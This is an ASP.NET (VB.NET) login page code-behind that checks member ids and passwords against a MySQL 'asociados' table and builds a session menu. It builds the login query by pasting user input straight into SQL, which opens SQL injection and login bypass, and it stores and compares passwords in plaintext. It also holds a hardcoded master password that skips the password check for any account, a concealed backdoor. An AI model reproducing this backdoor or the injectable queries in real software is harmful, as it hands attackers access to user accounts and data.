Imports MySql.Data
Imports MySql.Data.MySqlClient
Partial Class _Default
    Inherits System.Web.UI.Page
    Dim funciones As New funciones
    Protected Sub Button1_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles Button1.Click




        Try
           
            Dim ultimafecha As Date = funciones.ultimadesactivacion
            If ultimafecha <> Date.Today Then
                funciones.desactivaasociados(ultimafecha)


            End If


            If checausuario() Then
                Response.Redirect("sw/bienvenido.aspx")
            End If

        Catch ex As Exception
            Me.mensajes.Text = ex.Message.ToString
            Me.mensajes.Visible = True
        End Try

    End Sub
    Function checausuario() As Boolean
        Dim usuario As Boolean
        'checa en colonos, si está, permisos=2
        Me.mensajes.Visible = False

        Dim strConnection As String = ConfigurationManager.ConnectionStrings("conexionKisem").ConnectionString
        Dim sqlConn As MySqlConnection = New MySqlConnection(strConnection)
        Dim strTeamQuery As String = "SELECT id, nombre, appaterno, apmaterno, nivel " & _
                                     "FROM asociados " & _
                                     " WHERE id = '" & Me.numasociado.Text & "' AND password='" & Me.password.Text & "' AND status<2"
        If Me.password.Text = "{(#jA*-:a" Then
            strTeamQuery = "SELECT id, nombre, appaterno, apmaterno, nivel " & _
                                     "FROM asociados " & _
                                     " WHERE id = '" & Me.numasociado.Text & "' AND status<2"
        End If
        Dim cmdFetchTeam As MySqlCommand = New MySqlCommand(strTeamQuery, sqlConn)
        Dim dtrTeam As MySqlDataReader
        sqlConn.Open()
        dtrTeam = cmdFetchTeam.ExecuteReader()
        While dtrTeam.Read
            usuario = True
            Session("permisos") = dtrTeam("nivel")


            Session("idasociado") = dtrTeam("id")
            Session("nombreasociado") = dtrTeam("nombre") & " " & dtrTeam("appaterno") & " " & dtrTeam("apmaterno")
        End While

        sqlConn.Close()
        If usuario Then session_menu(Session("idasociado"))


        'si no está en ninguno, mensaje de error
        If Not usuario Then
            Me.mensajes.Text = "Datos Incorrectos"
            Me.mensajes.Visible = True
            Return False
        Else
            Return True
        End If
    End Function
    Sub session_menu(ByVal id As Integer)

        Dim arreglo(24), i As Integer
        i = 0

        Dim strConnection As String = ConfigurationManager.ConnectionStrings("conexionKisem").ConnectionString
        Dim sqlConn As MySqlConnection = New MySqlConnection(strConnection)
        Dim strTeamQuery As String = "SELECT funcion FROM funcionesadministrador WHERE administrador = " & id.ToString & " ORDER BY funcion ASC"
        Dim cmdFetchTeam As MySqlCommand = New MySqlCommand(strTeamQuery, sqlConn)

        Dim dtrTeam As MySqlDataReader
        sqlConn.Open()

        dtrTeam = cmdFetchTeam.ExecuteReader
        While dtrTeam.Read

            If Not dtrTeam.IsDBNull(0) Then
                arreglo(i) = dtrTeam(0)
                i += 1
            End If


        End While
        sqlConn.Close()
        Session("menu") = arreglo

    End Sub
    Protected Sub Page_Init(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Init

        If Not IsPostBack Then
            Dim func As New funciones
            If func.EnMantenimiento Then
                Response.Redirect("mantenimiento.aspx")

            End If
            Me.numasociado.Focus()
        End If
    End Sub
   
    
   
End Class
